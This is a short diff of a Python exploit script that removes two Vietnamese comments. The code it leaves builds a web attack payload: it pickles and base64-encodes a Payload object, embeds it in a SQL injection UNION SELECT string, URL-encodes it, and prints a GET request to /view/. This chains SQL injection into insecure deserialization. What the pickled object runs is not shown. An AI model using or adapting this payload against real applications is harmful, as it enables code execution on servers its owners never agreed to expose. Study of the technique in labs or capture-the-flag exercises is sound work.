@@ -76,10 +76,8 @@ class Payload:
 
 raw_base64 = base64.b64encode(pickle.dumps(Payload())).decode()
 
-# Tạo câu lệnh SQL
 sqli = f"' UNION SELECT '{raw_base64}' -- "
 
-# Mã hóa URL toàn bộ
 final_payload = urllib.parse.quote(sqli)
 
 print("GET /view/" + final_payload + " HTTP/1.1")
